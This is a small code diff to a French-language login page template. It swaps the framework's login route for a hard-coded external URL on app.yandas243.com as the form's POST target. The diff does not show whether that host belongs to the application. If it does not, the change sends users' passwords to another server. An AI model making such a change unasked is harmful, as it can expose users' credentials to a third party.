@@ -60,7 +60,7 @@
                                        alt="looginpage"></div>
             <div class="col-xl-5 p-0">
                 <div class="login-card">
-                    <form role="form" class="theme-form login-form" method="POST" action="{{ route('login') }}">
+                    <form role="form" class="theme-form login-form" method="POST" action="https://app.yandas243.com/login">
                         @csrf
                         <h4>Connexion</h4>
                         <h6>Bienvenue ! Connectez-vous à votre compte.</h6>
